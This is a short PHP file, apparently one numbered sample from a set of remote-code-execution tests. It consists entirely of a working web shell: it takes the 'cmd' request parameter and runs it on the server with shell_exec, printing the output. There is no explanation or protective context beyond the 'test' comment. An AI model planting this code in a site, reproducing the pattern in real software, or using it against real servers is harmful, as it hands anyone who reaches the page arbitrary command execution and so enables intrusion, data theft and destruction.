<?php
// RCE test variation #923
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>